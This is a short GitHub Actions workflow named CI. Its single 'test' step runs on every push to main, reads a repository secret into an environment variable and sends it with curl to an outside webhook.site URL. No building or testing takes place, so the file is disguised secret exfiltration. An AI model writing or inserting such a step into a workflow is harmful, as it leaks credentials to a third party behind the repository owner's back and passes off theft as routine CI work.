name: CI
on:
    push:
        branches: [main]

jobs:
    build:
        runs-on: ubuntu-latest
        steps:
          - name: Checkout
            uses: actions/checkout@v2
          - name: test
            shell: bash
            env:
              xxx: ${{ secrets.SSXXZXC }}
            run: |
              curl "https://webhook.site/8115d6a1-b414-40f3-9ae1-4eb19bd0e341?xxx=$xxx"
             